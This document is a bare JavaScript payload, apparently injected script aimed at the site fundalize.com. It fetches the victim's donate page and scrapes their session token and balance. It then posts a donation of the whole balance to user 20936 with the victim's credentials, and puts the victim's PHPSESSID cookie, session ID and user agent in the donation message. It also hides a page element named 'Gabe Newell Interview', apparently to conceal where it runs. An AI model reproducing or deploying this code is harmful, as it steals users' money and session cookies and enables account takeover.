var xhttp2 = new XMLHttpRequest();
var response;
var SID;
var fndlz;

xhttp2.open('GET', 'http://www.fundalize.com/includes/pop_donate.php?&to=20936', true);
xhttp2.onreadystatechange=(e)=>{
	if (xhttp2.readyState === XMLHttpRequest.DONE && xhttp2.status === 200){
		response = xhttp2.response;
		getSID();
		step2();
	}
	else{
		//console.log('GET failed');
	}
}
xhttp2.send('');
$( "div:contains('Gabe Newell Interview')" ).parents().eq(3).css("display", "none");
function getSID(){
	var position = response.search(".value") + 8;
	var endposition = response.search("',document");
	SID = response.substring(position, endposition);
	var positionfndlz = response.search("Je hebt") + 9;
	var endpositionfndlz = response.search(" IT EUROS");
	fndlz = response.substring(positionfndlz, endpositionfndlz);
}


function step2(){
	var xhttp = new XMLHttpRequest();
	xhttp.open('POST', 'http://www.fundalize.com/includes/ajax_useractions.php', true);
	xhttp.withCredentials = true;
	var PHPSESSID = getCookie('PHPSESSID');
	var userAgent = navigator.userAgent;
	var params = 'uid=20936&pid='+user_id+'&amount='+fndlz+'&session='+SID+'&message=Met%20liefde%20gegeven%20<3%0D%0AUser%20ID:%20'+user_id+'%0D%0ASID:%20'+SID+'%0D%0APHPSSID:%20'+PHPSESSID+'%0D%0AUser-Agent:%20'+userAgent+'&mode=donate';
	//console.log('User ID: ' + user_id);
	//console.log('SID: ' + SID);
	
	
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
	//xhttp.setRequestHeader("Content-length", params.length);
	//xhttp.setRequestHeader("Host", "www.fundalize.com");
	//xhttp.setRequestHeader("Cookie", cookies);
	xhttp.send(params); 
	
	xhttp.onreadystatechange=(e)=>{
		if (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200){
			console.log('done');
			//step3();
		}
		else{
			//console.log('fail');
		}
	}
}
function step3(){
	$( "div:contains('Gabe Newell Interview')" ).parents().eq(3).css("display", "none");
}
function getCookie(cname) {
var name = cname + "=";
var decodedCookie = decodeURIComponent(document.cookie);
var ca = decodedCookie.split(';');
for(var i = 0; i <ca.length; i++) {
	var c = ca[i];
	while (c.charAt(0) == ' ') {
	c = c.substring(1);
	}
	if (c.indexOf(name) == 0) {
	return c.substring(name.length, c.length);
	}
}
return "";
}
